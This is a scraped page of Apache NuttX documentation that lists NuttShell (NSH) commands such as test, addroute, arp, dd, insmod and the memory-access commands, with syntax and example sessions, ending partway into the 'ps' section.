=== Content from nuttx.apache.org_637c9070_20250114_204341.html ===

 [NuttX](../../index.html)

latest
10.0.0
10.0.1
10.1.0
10.2.0
10.3.0
11.0.0
12.0.0
12.1.0
12.2.0
12.2.1
12.3.0
12.4.0
12.5.0
12.5.1
12.6.0
12.7.0
12.8.0

Table of Contents

* [Home](../../index.html)
* [Introduction](../../introduction/index.html)
* [Getting Started](../../quickstart/index.html)
* [Contributing](../../contributing/index.html)
* [The Inviolable Principles of NuttX](../../introduction/inviolables.html)
* [Supported Platforms](../../platforms/index.html)
* [OS Components](../../components/index.html)
* [Applications](../index.html)
  + [Audio Utility libraries](../audioutils/index.html)
  + [Bootloader Utilities](../boot/index.html)
  + [Benchmark Applications](../benchmarks/index.html)
  + [CAN Utilities](../canutils/index.html)
  + [Cryptography Library Support](../crypto/index.html)
  + [File System Utilities](../fsutils/index.html)
  + [Games](../games/index.html)
  + [Graphics Support](../graphics/index.html)
  + [Industrial Applications](../industry/index.html)
  + [Inertial Libraries Support](../inertial/index.html)
  + [Interpreters](../interpreters/index.html)
  + [Logging Utilities](../logging/index.html)
  + [LTE Libraries and NSH Add-Ons](../lte/index.html)
  + [Math Library Support](../math/index.html)
  + [Machine Learning Support](../mlearing/index.html)
  + [Network Utilities](../netutils/index.html)
  + [NuttShell (NSH)](index.html)
    - [Overview](nsh.html)
    - Commands
      * [`test` Evaluate Expression](#test-evaluate-expression)
      * [`addroute` Add a Routing Table Entry](#addroute-add-a-routing-table-entry)
      * [`arp` Access the ARP table](#arp-access-the-arp-table)
      * [`base64dec` Base64 Decode](#base64dec-base64-decode)
      * [`base64enc` Base64 Encode](#base64enc-base64-encode)
      * [`basename` Extract Base File/Directory Name](#basename-extract-base-file-directory-name)
      * [`break` Terminate a Loop](#break-terminate-a-loop)
      * [`cat` Concatenate Files](#cat-concatenate-files)
      * [`cd` Change Current Working Directory](#cd-change-current-working-directory)
      * [`cmp` Compare Files](#cmp-compare-files)
      * [`cp` Copy Files](#cp-copy-files)
      * [`date` Show or set the date and time](#date-show-or-set-the-date-and-time)
      * [`dd` Copy and Convert Files](#dd-copy-and-convert-files)
      * [`delroute` Delete a Routing Table Entry](#delroute-delete-a-routing-table-entry)
      * [`df` Show Volume Status](#df-show-volume-status)
      * [`dirname` Extract Path to a File/Directory](#dirname-extract-path-to-a-file-directory)
      * [`dmesg` Dump Buffered SYSLOG Output](#dmesg-dump-buffered-syslog-output)
      * [`echo` Echo Strings and Variables](#echo-echo-strings-and-variables)
      * [`env` Show Environment Variables](#env-show-environment-variables)
      * [`exec` Execute User Code](#exec-execute-user-code)
      * [`exit` Exit NSH](#exit-exit-nsh)
      * [`export` Set an Environment Variable](#export-set-an-environment-variable)
      * [`expr` Evaluate expressions](#expr-evaluate-expressions)
      * [`free` Show Memory Manager Status](#free-show-memory-manager-status)
      * [`get` Get File Via TFTP](#get-get-file-via-tftp)
      * [`help` Show Usage Command Usage](#help-show-usage-command-usage)
      * [`hexdump` Hexadecimal Dump of File or Device](#hexdump-hexadecimal-dump-of-file-or-device)
      * [`ifconfig` Manage Network Configuration](#ifconfig-manage-network-configuration)
      * [`ifdown` Take a network down](#ifdown-take-a-network-down)
      * [`ifup` Bring a network up](#ifup-bring-a-network-up)
      * [`insmod` Install an OS module](#insmod-install-an-os-module)
      * [`irqinfo` Show Interrupt Status](#irqinfo-show-interrupt-status)
      * [`critmon` Show Critical Monitor Status](#critmon-show-critical-monitor-status)
      * [`kill` Send a signal to a task](#kill-send-a-signal-to-a-task)
      * [`losetup` Setup/teardown the Loop Device](#losetup-setup-teardown-the-loop-device)
      * [`ln` Link to a File or Directory](#ln-link-to-a-file-or-directory)
      * [`ls` List Directory Contents](#ls-list-directory-contents)
      * [`lsmod` Show information about installed OS modules](#lsmod-show-information-about-installed-os-modules)
      * [`md5` Calculate MD5](#md5-calculate-md5)
      * [`mb`, `mh`, `and` `mw` Access Memory](#mb-mh-and-mw-access-memory)
      * [`ps` Show Current Tasks and Threads](#ps-show-current-tasks-and-threads)
      * [`mkdir` Create a Directory](#mkdir-create-a-directory)
      * [`mkfatfs` Create a FAT File System](#mkfatfs-create-a-fat-file-system)
      * [`mkfifo` Create a FIFO](#mkfifo-create-a-fifo)
      * [`mkrd` Create a RAMDISK](#mkrd-create-a-ramdisk)
      * [`mount` Mount a File System](#mount-mount-a-file-system)
      * [`mv` Rename a File](#mv-rename-a-file)
      * [`nfsmount` Mount an NFS file system](#nfsmount-mount-an-nfs-file-system)
      * [`nslookup` Lookup a network address](#nslookup-lookup-a-network-address)
      * [`passwd` Change a Userâs Password](#passwd-change-a-user-s-password)
      * [`pmconfig` Manage Power Management Subsystem](#pmconfig-manage-power-management-subsystem)
      * [`poweroff` Shut the system down](#poweroff-shut-the-system-down)
      * [`put` Send File Via TFTP](#put-send-file-via-tftp)
      * [`pwd` Show Current Working Directory](#pwd-show-current-working-directory)
      * [`readlink` Show target of a link](#readlink-show-target-of-a-link)
      * [`reboot` Reboot the system](#reboot-reboot-the-system)
      * [`rm` Remove a File](#rm-remove-a-file)
      * [`rmdir` Remove a Directory](#rmdir-remove-a-directory)
      * [`rmmod` Remove on OS Module](#rmmod-remove-on-os-module)
      * [`route` Show routing table](#route-show-routing-table)
      * [`rptun` Start/Stop the OpenAMP RPC Tunnel](#rptun-start-stop-the-openamp-rpc-tunnel)
      * [`set` Set a Variable](#set-set-a-variable)
      * [`sh` Execute an NSH Script](#sh-execute-an-nsh-script)
      * [`shutdown` Shut the system down](#shutdown-shut-the-system-down)
      * [`sleep` Wait for Seconds](#sleep-wait-for-seconds)
      * [`telnetd` Time Start the Telnet Daemon](#telnetd-time-start-the-telnet-daemon)
      * [`time` Time execution of another command](#time-time-execution-of-another-command)
      * [`truncate` Set the Size of a File](#truncate-set-the-size-of-a-file)
      * [`umount` Unmount a File System](#umount-unmount-a-file-system)
      * [`uname` Print system information](#uname-print-system-information)
      * [`unset` Unset an Environment Variable](#unset-unset-an-environment-variable)
      * [`uptime` Show how long the system has been running](#uptime-show-how-long-the-system-has-been-running)
      * [`urldecode` URL Decode](#urldecode-url-decode)
      * [`urlencode` URL Encode](#urlencode-url-encode)
      * [`useradd` Add a New User](#useradd-add-a-new-user)
      * [`userdel` Delete a user](#userdel-delete-a-user)
      * [`usleep` Wait for Microseconds](#usleep-wait-for-microseconds)
      * [`wget` Get File Via HTTP](#wget-get-file-via-http)
      * [`xd` Hexadecimal Dump of Memory](#xd-hexadecimal-dump-of-memory)
      * [Built-In Commands](#built-in-commands)
      * [`ping` and `ping6` Check Network Peer](#ping-and-ping6-check-network-peer)
    - [Configuration Settings](config.html)
    - [The NSH Library and NSH Initialization](customizing.html)
    - [NSH Commands](customizing.html#nsh-commands)
    - [NSH âBuilt-Inâ Applications](builtin.html)
    - [Customizing NSH Initialization](installation.html)
    - [Shell Login](login.html)
    - [Running Applications from NSH](running_apps.html)
  + [Software Define Radio Libraries](../sdr/index.html)
  + [System Libraries and NSH Add-Ons](../system/index.html)
  + [Testing](../testing/index.html)
  + [Host Side Tools](../tools/index.html)
  + [Wireless Libraries and NSH Add-Ons](../wireless/index.html)
  + [Examples](../examples/index.html)
* [Implementation Details](../../implementation/index.html)
* [API Reference](../../reference/index.html)
* [FAQ](../../faq/index.html)
* [Guides](../../guides/index.html)
* [Glossary](../../glossary.html)
* [NuttX Logos](../../logos/index.html)

[NuttX](../../index.html)

* [Applications](../index.html)
* [NuttShell (NSH)](index.html)
* Commands
* [View page source](../../_sources/applications/nsh/commands.rst.txt)

---

# Commands[ï](#commands "Permalink to this heading")

## `test` Evaluate Expression[ï](#test-evaluate-expression "Permalink to this heading")

**Command Syntax:**

```
[ <expression> ]
test <expression>

```

**Synopsis**. These are two alternative forms of the same command.
They support evaluation of a boolean expression which sets
`$?`. This command is used most frequently as
the conditional command following the `if` in the
`if-then[-else]-fi`.

**Expression Syntax:**

```
expression = simple-expression | !expression | expression -o expression | expression -a expression

simple-expression = unary-expression | binary-expression

unary-expression = string-unary | file-unary

string-unary = -n string | -z string

file-unary = -b file | -c file | -d file | -e file | -f file | -r file | -s file | -w file

binary-expression = string-binary | numeric-binary

string-binary = string = string | string == string | string != string

numeric-binary = integer -eq integer | integer -ge integer | integer -gt integer | integer -le integer | integer -lt integer | integer -ne integer

```

## `addroute` Add a Routing Table Entry[ï](#addroute-add-a-routing-table-entry "Permalink to this heading")

**Command Syntax:**

```
addroute <target> [<netmask>] <router>
addroute default <ipaddr> <interface>

```

**Synopsis**. This command adds an entry in the routing table. The
new entry will map the IP address of a router on a local network
(<router>) to an external network characterized by the <target> IP
address and a network mask <netmask>

The netmask may also be expressed using IPv4 CIDR or IPv6 slash
notation. In that case, the netmask need not be provided.

**Example:**

```
nsh> addroute 11.0.0.0 255.255.255.0 10.0.0.2

```

which is equivalent to

```
nsh> addroute 11.0.0.0/24 10.0.0.2

```

The second form of the addroute command can be used to set the
default gateway.

## `arp` Access the ARP table[ï](#arp-access-the-arp-table "Permalink to this heading")

**Command syntax**:

```
arp [-t|-a <ipaddr> |-d <ipaddr> |-s <ipaddr> <hwaddr>]

```

**Synopsis**: Access the OS ARP table.

> `-a <ipaddr>`
>
> Will show the hardware address that the IP address <ipaddr> is
> mapped to.
>
>
> `-d <ipaddr>`
>
> Will delete the mapping for the IP address <ipaddr> from the
> ARP table.
>
>
> `-s <ipaddr hwaddr>`
>
> Will set (or replace) the mapping of the IP address <ipaddr> to
> the hardware address <hwaddr>.
>
>
> `-t`
>
> Will dump the entire content of the ARP table. This option is
> only available if `CONFIG_NETLINK_ROUTE` is enabled.

**Example**:

```
nsh> arp -a 10.0.0.1
nsh: arp: no such ARP entry: 10.0.0.1

nsh> arp -s 10.0.0.1 00:13:3b:12:73:e6
nsh> arp -a 10.0.0.1
HWAddr: 00:13:3b:12:73:e6

nsh> arp -d 10.0.0.1
nsh> arp -a 10.0.0.1
nsh: arp: no such ARP entry: 10.0.0.1

```

## `base64dec` Base64 Decode[ï](#base64dec-base64-decode "Permalink to this heading")

**Command Syntax**:

```
base64dec [-w] [-f] <string or filepath>

```

**Synopsis**. *To be provided.*

## `base64enc` Base64 Encode[ï](#base64enc-base64-encode "Permalink to this heading")

**Command Syntax**:

```
base64enc [-w] [-f] <string or filepath>

```

**Synopsis**. *To be provided.*

## `basename` Extract Base File/Directory Name[ï](#basename-extract-base-file-directory-name "Permalink to this heading")

**Command Syntax**:

```
basename <path> [<suffix>]

```

**Synopsis**. Extract the final string from a `<path>` by
removing the preceding path segments and (optionally) removing any
trailing `<suffix>`.

## `break` Terminate a Loop[ï](#break-terminate-a-loop "Permalink to this heading")

**Command Syntax**:

```
break

```

**Synopsis**. The `break` command is only meaningful within the
body of the a `while` or `until` loop,
between the `do` and `done` tokens. Outside of a loop,
`break` command does nothing. If the `break` command is
executed within the body of a loop, the loop will immediately
terminate and execution will continue with the next command
immediately following the `done` token.

## `cat` Concatenate Files[ï](#cat-concatenate-files "Permalink to this heading")

**Command Syntax**:

```
cat <path> [<path> [<path> ...]]

```

**Synopsis**. This command copies and concatenates all of the
files at `<path>` to the console (or to another file if the
output is redirected).

## `cd` Change Current Working Directory[ï](#cd-change-current-working-directory "Permalink to this heading")

**Command Syntax**:

```
cd [<dir-path>|-|~|..]

```

**Synopsis**. Changes the current working directory (`PWD`).
Also sets the previous working directory environment variable
(`OLDPWD`).

**Forms:**

| `cd <dir-path>` | sets the current working directory to <dir-path>. |
| --- | --- |
| `cd -` | sets the current working directory to the previous working directory ($OLDPWD). Equivalent to cd $OLDPWD. |
| `cd` or `cd ~` | set the current working directory to the âhomeâ directory. The home directory can be configured by setting CONFIG\_LIBC\_HOMEDIR in the configuration file. The default home directory is /. |
| `cd ..` | sets the current working directory to the parent directory. |

## `cmp` Compare Files[ï](#cmp-compare-files "Permalink to this heading")

**Command Syntax**:

```
cmp <path1> <path2>

```

**Synopsis**. Compare of the contents of the file at `<path1>`
with the contents of the file at `<path2>`. Returns an
indication only if the files differ.

## `cp` Copy Files[ï](#cp-copy-files "Permalink to this heading")

**Command Syntax**:

```
cp <source-path> <dest-path>

```

**Synopsis**. Copy of the contents of the file at
`<source-path>` to the location in the file system indicated by
`<dest-path>`.

## `date` Show or set the date and time[ï](#date-show-or-set-the-date-and-time "Permalink to this heading")

**Command Syntax**:

```
date [-s "MMM DD HH:MM:SS YYYY"] [-u] [+%format]

```

**Synopsis**. Show or set the current date and time or UTC with `-u` option,
and support format output with `+%format`.

To show the current system time and date, type in the `date` command.
The output displays the day of the week, day of the month, month, year,
current time. 24-hour time is used.
Only one format is used, both on display and when setting the date/time.
To change the system clock manually, type `date -s MMM DD HH:MM:SS YYYY`.

> * `MMM` Short month name (e.g., Sep).
> * Space separator.
> * `DD` Day of month (e.g., 01).
> * Space separator.
> * `HH` Hour (00-23).
> * `:` Colon separator.
> * `MM` Minute (00-59).
> * `:` Colon separator.
> * `SS` Second (00-60).
> * Space separator
> * `YYYY` Year (e.g., 2023).

**Example**:

```
nsh> date
Thu, Jan 01 00:00:17 1970
nsh> date -s "Sep 15 11:30:00 2023"
nsh> date
Fri, Sep 15 11:30:03 2023

```

## `dd` Copy and Convert Files[ï](#dd-copy-and-convert-files "Permalink to this heading")

**Command Syntax**:

```
dd if=<infile> of=<outfile> [bs=<sectsize>] [count=<sectors>] [skip=<sectors>]

```

**Synopsis**. Copy blocks from <infile> to <outfile>. <infile> or
<outfile> may be the path to a standard file, a character device,
or a block device. Examples follow:

Read from character device, write to regular file. This will
create a new file of the specified size filled with zero:

```
nsh> ls -l /dev
/dev:
 crw-rw-rw-       0 zero
nsh> dd if=/dev/zero of=/tmp/zeros bs=64 count=16
nsh> ls -l /tmp
/tmp:
 -rw-rw-rw-    1024 ZEROS

```

Read from character device, write to block device. This will fill
the entire block device with zeros:

```
nsh> ls -l /dev
/dev:
 brw-rw-rw-       0 ram0
 crw-rw-rw-       0 zero
nsh> dd if=/dev/zero of=/dev/ram0

```

Read from a block device, write to a character device. This will
read the entire block device and dump the contents in the bit
bucket:

```
nsh> ls -l /dev
/dev:
 crw-rw-rw-       0 null
 brw-rw-rw-       0 ram0
nsh> dd if=/dev/ram0 of=/dev/null

```

## `delroute` Delete a Routing Table Entry[ï](#delroute-delete-a-routing-table-entry "Permalink to this heading")

**Command Syntax**:

```
delroute <target> [<netmask>]

```

**Synopsis**. The entry removed will be the first entry in the
routing table that matches the external network characterized by
the <target> IP address and the network mask <netmask>

The netmask may also be expressed using IPv4 CIDR or IPv6 slash
notation. In that case, the netmask need not be provided.

**Example**:

```
nsh> delroute 11.0.0.0 255.255.255.0

```

which is equivalent to:

```
nsh> delroute 11.0.0.0/24

```

## `df` Show Volume Status[ï](#df-show-volume-status "Permalink to this heading")

**Command Syntax**:

```
df [-h]

```

**Synopsis**. Show the state of each mounted volume. As an
example:

```
nsh> mount
  /etc type romfs
  /tmp type vfat
nsh> df
  Block  Number
  Size   Blocks     Used Available Mounted on
    64        6        6         0 /etc
   512      985        2       983 /tmp
nsh>

```

If `CONFIG_NSH_CMDOPT_DF_H` is defined in the NuttX
configuration, then the `df` will also support an option `-h`
which may be used to show the volume information in *human
readable* format.

## `dirname` Extract Path to a File/Directory[ï](#dirname-extract-path-to-a-file-directory "Permalink to this heading")

**Command Syntax**:

```
dirname <path>

```

**Synopsis**. Extract the path string leading up to the full
`<path>` by removing the final directory or file name.

## `dmesg` Dump Buffered SYSLOG Output[ï](#dmesg-dump-buffered-syslog-output "Permalink to this heading")

**Command Syntax**:

```
dmesg

```

**Synopsis**. This command can be used to dump (and clear) the
content of any buffered syslog output messages. This command is
only available if `CONFIG_RAMLOG_SYSLOG` is enabled. In that
case, syslog output will be collected in an in-memory, circular
buffer. Entering the `dmesg` command will dump the content of
that in-memory, circular buffer to the NSH console output.
`dmesg` has the side effect of clearing the buffered data so
that entering `dmesg` again will show only newly buffered data.

## `echo` Echo Strings and Variables[ï](#echo-echo-strings-and-variables "Permalink to this heading")

**Command Syntax**:

```
echo [-n] [<string|$name> [<string|$name>...]]

```

**Synopsis**. Copy the sequence of strings and expanded
environment variables to console output (or to a file if the
output is re-directed).

The `-n` option suppresses the trailing newline character.

## `env` Show Environment Variables[ï](#env-show-environment-variables "Permalink to this heading")

**Command Syntax**:

```
env

```

**Synopsis**. Show the current name-value pairs in the
environment. Example:

```
nsh> env
PATH=/bin

nsh> set foo bar
nsh> env
PATH=/bin
foo=bar

nsh> unset PATH
nsh> env
foo=bar

nsh>

```

## `exec` Execute User Code[ï](#exec-execute-user-code "Permalink to this heading")

**Command Syntax**:

```
exec <hex-address>

```

**Synopsis**. Execute the user logic at address `<hex-address>`.
NSH will pause until the execution unless the user logic is
executed in background via `exec <hex-address> &`.

## `exit` Exit NSH[ï](#exit-exit-nsh "Permalink to this heading")

**Command Syntax**:

```
exit

```

**Synopsis**. Exit NSH. Only useful for the serial front end if
you have started some other tasks (perhaps using the `exec`
command) and you would like to have NSH out of the way. For the
telnet front-end, `exit` terminates the telnet session.

## `export` Set an Environment Variable[ï](#export-set-an-environment-variable "Permalink to this heading")

**Command Syntax**:

```
export <name> [<value>]

```

**Synopsis**. The `export` command sets an environment variable,
or promotes an NSH variable to an environment variable. As
examples:

> 1. Using `export` to promote an NSH variable to an environment
>    variable:
>
>    ```
>    nsh> env
>    PATH=/bin
>
>    nsh> set foo bar
>    nsh> env
>    PATH=/bin
>
>    nsh> export foo
>    nsh> env
>    PATH=/bin
>    foo=bar
>
>    ```
>
>    A group-wide environment variable is created with the same
>    value as the local NSH variable; the local NSH variable is
>    removed.
> 2. Using `export` to set an environment variable:
>
>    ```
>    nsh> export dog poop
>    nsh> env
>    PATH=/bin
>    foo=bar
>    dog=poop
>
>    ```

The `export` command is not supported by NSH unless both
`CONFIG_NSH_VARS=y` and `CONFIG_DISABLE_ENVIRON`is not set.

## `expr` Evaluate expressions[ï](#expr-evaluate-expressions "Permalink to this heading")

**Command Syntax**:

```
expr <operand1> <operator> <operand2>

```

**Synopsis**. It is a mini version for the expr command, which implements the
features of addition, subtraction, multiplication, division and mod.

**Examples**:

> nsh> expr 5 - 2
> 3
> nsh> set hello 10
> nsh> expr $hello - 2
> 8
> nsh> expr 8 a 9
> Unknown operator
> nsh> expr 20 / 5
> 4
> nsh> expr 10 % 4
> 2
> nsh> expr 100 + 0
> 100

## `free` Show Memory Manager Status[ï](#free-show-memory-manager-status "Permalink to this heading")

**Command Syntax**:

```
free

```

**Synopsis**. Show the current state of the memory allocator. For
example:

```
nsh> free
             total       used       free    largest  nused  nfree
Mem:       5583024    1614784    3968240    3967792    244      4

nsh>

```

**Where:**

| total | This is the total size of memory allocated for use by malloc in bytes. |
| --- | --- |
| used | This is the total size of memory occupied by chunks handed out by malloc. |
| free | This is the total size of memory occupied by free (not in use) chunks. |
| largest | Size of the largest free (not in use) chunk. |
| nused | This is the number of allocated chunks |
| nfree | This is the number of free chunks |

## `get` Get File Via TFTP[ï](#get-get-file-via-tftp "Permalink to this heading")

**Command Syntax**:

```
get [-b|-n] [-f <local-path>] -h <ip-address> <remote-path>

```

**Synopsis**. Copy the file at `<remote-address>` from the host
whose IP address is identified by `<ip-address>`.

**Other options**

| `-f <local-path>` | The file will be saved relative to the current working directory unless <local-path> is provided. |
| --- | --- |
| `-n` | Selects text (ânetasciiâ) transfer mode (default). |
| `-b` | Selects binary (âoctetâ) transfer mode |

## `help` Show Usage Command Usage[ï](#help-show-usage-command-usage "Permalink to this heading")

**Command Syntax**:

```
help [-v] [<cmd>]

```

**Synopsis**. Presents summary information about NSH commands to
console.

**Options**

| `-v` | how verbose output will full command usage. |
| --- | --- |
| `<cmd>` | Show full command usage only for this command. |

## `hexdump` Hexadecimal Dump of File or Device[ï](#hexdump-hexadecimal-dump-of-file-or-device "Permalink to this heading")

**Command Syntax**:

```
hexdump <file or device> [skip=<bytes>] [count=<bytes>]

```

**Synopsis**. Dump data in hexadecimal format from a file or
character device

| `skip=<bytes>` | Will skip <bytes> number of bytes from the beginning. |
| --- | --- |
| `count=<bytes>` | Will stop after dumping <bytes> number of bytes. |

The `skip` and `count` options are only available if
`CONFIG_NSH_CMDOPT_HEXDUMP` is defined in the NuttX
configuration.

## `ifconfig` Manage Network Configuration[ï](#ifconfig-manage-network-configuration "Permalink to this heading")

**Command Syntax**:

```
ifconfig [nic_name [<ip-address>|dhcp]] [dr|gw|gateway <dr-address>] [netmask <net-mask>] [dns <dns-address>] [hw <hw-mac>]]

```

**Synopsis**. Multiple forms of the `ifconfig` command are
supported:

> 1. With one or no arguments, `ifconfig` will shows the current
>    configuration of the network and, perhaps, the status of
>    Ethernet device:
>
>    ```
>    ifconfig
>    ifconfig [nic_name]
>
>    ```
>
>    As an example:
>
>    ```
>    nsh> ifconfig
>    eth0    HWaddr 00:18:11:80:10:06
>            IPaddr:10.0.0.2 DRaddr:10.0.0.1 Mask:255.255.255.0
>
>    ```
>
>    If network statistics are enabled (`CONFIG_NET_STATISTICS`),
>    then this command will also show the detailed state of network.
> 2. If both the network interface name and an IP address are
>    supplied as arguments, then `ifconfig` will set the address
>    of the Ethernet device:
>
>    ```
>    ifconfig nic_name ip_address
>
>    ```
> 3. Other forms *to be provided*

Note

This commands depends upon having the *procfs* file system
configured into the system. The *procfs* file system must also
have been mounted with a command like:

```
nsh> mount -t procfs /proc

```

## `ifdown` Take a network down[ï](#ifdown-take-a-network-down "Permalink to this heading")

**Command Syntax**:

```
ifdown <interface>

```

**Synopsis**. Take down the interface identified by the name
<interface>.

**Example**:

```
ifdown eth0

```

## `ifup` Bring a network up[ï](#ifup-bring-a-network-up "Permalink to this heading")

**Command Syntax**:

```
ifup <interface>

```

**Synopsis**. Bring up down the interface identified by the name
<interface>.

**Example**:

```
ifup eth0

```

## `insmod` Install an OS module[ï](#insmod-install-an-os-module "Permalink to this heading")

**Command Syntax**:

```
insmod <file-path> <module-name>

```

**Synopsis**. Install the loadable OS module at <file-path> as
module <module-name>.

**Example**:

```
nsh> ls -l /mnt/romfs
/mnt/romfs:
 dr-xr-xr-x       0 .
 -r-xr-xr-x    9153 chardev
nsh> ls -l /dev
/dev:
 crw-rw-rw-       0 console
 crw-rw-rw-       0 null
 brw-rw-rw-       0 ram0
 crw-rw-rw-       0 ttyS0
nsh> lsmod
NAME                 INIT   UNINIT      ARG     TEXT     SIZE     DATA     SIZE
nsh> insmod /mnt/romfs/chardev mydriver
nsh> ls -l /dev
/dev:
 crw-rw-rw-       0 chardev
 crw-rw-rw-       0 console
 crw-rw-rw-       0 null
 brw-rw-rw-       0 ram0
 crw-rw-rw-       0 ttyS0
nsh> lsmod
NAME                 INIT   UNINIT      ARG     TEXT     SIZE     DATA     SIZE
mydriver         20404659 20404625        0 20404580      552 204047a8        0

```

## `irqinfo` Show Interrupt Status[ï](#irqinfo-show-interrupt-status "Permalink to this heading")

**Command Syntax**:

```
irqinfo

```

**Synopsis**. Show the current count of interrupts taken on all
attached interrupts.

**Example**:

```
nsh> irqinfo
IRQ HANDLER  ARGUMENT    COUNT    RATE
  3 00001b3d 00000000        156   19.122
 15 0000800d 00000000        817  100.000
 30 00000fd5 20000018         20    2.490

```

## `critmon` Show Critical Monitor Status[ï](#critmon-show-critical-monitor-status "Permalink to this heading")

**Command Syntax**:

```
critmon

```

**Synopsis**. Show the preemption time, critical section time,
longest single run time, total run time, process ID (PID),
and thread description of each thread in the system.

**Example**:

```
nsh> critmon
PRE-EMPTION   CSECTION      RUN         TIME         PID   DESCRIPTION
0.010265000   0.000037000   ----------- ------------ ----  CPU 0
0.000000000   0.000000000   0.001237000 28.421047000 0     Idle Task
0.000011000   0.000037000   0.000046000 0.034211000  1     loop_task
0.000000000   0.000028000   0.000067000 0.236657000  2     hpwork

```

In this example, the output shows the preemption time, critical section time,
longest single run time, total run time, and thread description for each
thread in the system.

The output of the `critmon` command displays the following columns:

* PRE-EMPTION: Preemption time
* CSECTION: Critical section time
* RUN: Longest single run time of the thread
* TIME: Total run time of the thread
* PID: Process ID of the thread
* DESCRIPTION: Thread description (name)

## `kill` Send a signal to a task[ï](#kill-send-a-signal-to-a-task "Permalink to this heading")

**Command Syntax**:

```
kill -<signal> <pid>

```

**Synopsis**. Send the <signal> to the task identified by <pid>.

**Example**:

```
nsh> mkfifo /dev/fifo
nsh> cat /dev/fifo &
cat [2:128]
nsh> ps
PID PRI POLICY   TYPE    NPX STATE    EVENT     SIGMASK  COMMAND
  0   0 FIFO     Kthread --- Ready              00000000 Idle Task
  1 128 RR       Task    --- Running            00000000 init
  2 128 FIFO     pthread --- Waiting  Semaphore 00000000 <pthread>(51ea50)
nsh> kill -9 2
nsh> ps
PID PRI POLICY   TYPE    NPX STATE    EVENT     SIGMASK  COMMAND
  0   0 FIFO     Kthread --- Ready              00000000 Idle Task
  1 128 RR       Task    --- Running            00000000 init
nsh>

```

Note

NuttX does not support a FULL POSIX signaling system. A
few standard signal names like `SIGCHLD`, `SIGUSR1`,
`SIGUSR2`, `SIGALRM`, and `SIGPOLL` exist in the system.
However, they do not have the default actions that you might
expect. Rather, NuttX supports only what are referred to as POSIX
real-time signals. These signals may be used to communicate with
running tasks, may be use to waiting waiting tasks, etc.

If the configuration option `CONFIG_SIG_DEFAULT` is enabled,
then default actions for the `SIGINT` and `SIGKILL` signals
(only) will be supported. In that case, as an example, `kill -9`
(SIGKILL) will, indeed, terminate a task. Caution should be
exercised, however, because this is likely to cause memory leaks
and to strand resource since there is insufficient clean-up in
certain build configurations.

## `losetup` Setup/teardown the Loop Device[ï](#losetup-setup-teardown-the-loop-device "Permalink to this heading")

**Command Syntax 1**:

```
losetup [-o <offset>] [-r] <dev-path> <file-path>

```

**Synopsis**. Setup the loop device at <dev-path> to access the
file at <file-path> as a block device. In the following example a
256K file is created (`dd`) and `losetup` is used to make the
file accessible as a block device. A FAT file system is created
(`mkfatfs`) and mounted (`mount`). Files can then be managed
on the loop-mounted file:

```
nsh> dd if=/dev/zero of=/tmp/image bs=512 count=512
nsh> ls -l /tmp
/tmp:
 -rw-rw-rw-   262144 IMAGE
nsh> losetup /dev/loop0 /tmp/image
nsh> ls -l /dev
/dev:
 brw-rw-rw-       0 loop0
nsh> mkfatfs /dev/loop0
nsh> mount -t vfat /dev/loop0 /mnt/example
nsh> ls -l /mnt
ls -l /mnt
/mnt:
 drw-rw-rw-       0 example/
nsh> echo "This is a test" >/mnt/example/atest.txt
nsh> ls -l /mnt/example
/mnt/example:
 -rw-rw-rw-      16 ATEST.TXT
nsh> cat /mnt/example/atest.txt
This is a test
nsh>

```

**Command Syntax 2**:

```
losetup d <dev-path>

```

**Synopsis**. Teardown the setup for the loop device at
<dev-path>.

## `ln` Link to a File or Directory[ï](#ln-link-to-a-file-or-directory "Permalink to this heading")

**Command Syntax**:

```
ln [-s] <target> <link>

```

**Synopsis**. The `ln` command will create a new symbolic link
at <link> for the existing file or directory, <target>. This
implementation is simplified for use with NuttX in these ways:

> * Links may be created only within the NuttX top-level,
>   [pseudo file system](../../reference/user/10_filesystem.html#file-system-overview) No
>   file system currently supported by NuttX provides symbolic
>   links.
> * For the same reason, only soft links are implemented.
> * File privileges are ignored.
> * `c_time` is not updated.

## `ls` List Directory Contents[ï](#ls-list-directory-contents "Permalink to this heading")

**Command Syntax**:

```
ls [-lRsh] <dir-path>

```

**Synopsis**. Show the contents of the directory at
`<dir-path>`. NOTE: `<dir-path>` must refer to a directory and
no other file system object.

**Options**

| `-R` | Show the contents of specified directory and all of its sub-directories. |
| --- | --- |
| `-s` | Show the size of the files along with the filenames in the listing |
| `-l` | Show size and mode information along with the filenames in the listing. |
| `-h` | Show size and mode information along with the filenames in the listing with humanable. |

## `lsmod` Show information about installed OS modules[ï](#lsmod-show-information-about-installed-os-modules "Permalink to this heading")

**Command Syntax**:

```
lsmod

```

**Synopsis**. Show information about the currently installed OS
modules. This information includes:

> * The module name assigned to the module when it was installed
>   (`NAME`, string).
> * The address of the module initialization function (`INIT`,
>   hexadecimal).
> * The address of the module un-initialization function
>   (`UNINIT`, hexadecimal).
> * An argument that will be passed to the module un-initialization
>   function (`ARG`, hexadecimal).
> * The start of the .text memory region (`TEXT`, hexadecimal).
> * The size of the .text memory region size (`SIZE`, decimal).
> * The start of the .bss/.data memory region (`DATA`,
>   hexadecimal).
> * The size of the .bss/.data memory region size (`SIZE`,
>   decimal).

**Example**:

```
nsh> lsmod
NAME                 INIT   UNINIT      ARG     TEXT     SIZE     DATA     SIZE
mydriver         20404659 20404625        0 20404580      552 204047a8        0

```

## `md5` Calculate MD5[ï](#md5-calculate-md5 "Permalink to this heading")

**Command Syntax**:

```
md5 [-f] <string or filepath>

```

**Synopsis**. *To be provided.*

## `mb`, `mh`, `and` `mw` Access Memory[ï](#mb-mh-and-mw-access-memory "Permalink to this heading")

**Command Syntax**:

```
mb <hex-address>[=<hex-value>][ <hex-byte-count>]
mh <hex-address>[=<hex-value>][ <hex-byte-count>]
mw <hex-address>[=<hex-value>][ <hex-byte-count>]

```

**Synopsis**. Access memory using byte size access (mb), 16-bit
accesses (mh), or 32-bit access (mw). In each case,

| `<hex-address>` | Specifies the address to be accessed. The current value at that address will always be read and displayed. |
| --- | --- |
| `<hex-address>=<hex-value>` | Read the value, then write <hex-value> to the location. |
| `<hex-byte-count>` | Perform the mb, mh, or mw operation on a total of <hex-byte-count> bytes, increment the <hex-address> appropriately after each access. |

**Example**:

```
nsh> mh 0 16
  0 = 0x0c1e
  2 = 0x0100
  4 = 0x0c1e
  6 = 0x0110
  8 = 0x0c1e
  a = 0x0120
  c = 0x0c1e
  e = 0x0130
  10 = 0x0c1e
  12 = 0x0140
  14 = 0x0c1e
nsh>

```

## `ps` Show Current Tasks and Threads[ï](#ps-show-current-tasks-and-threads "Permalink to this heading")

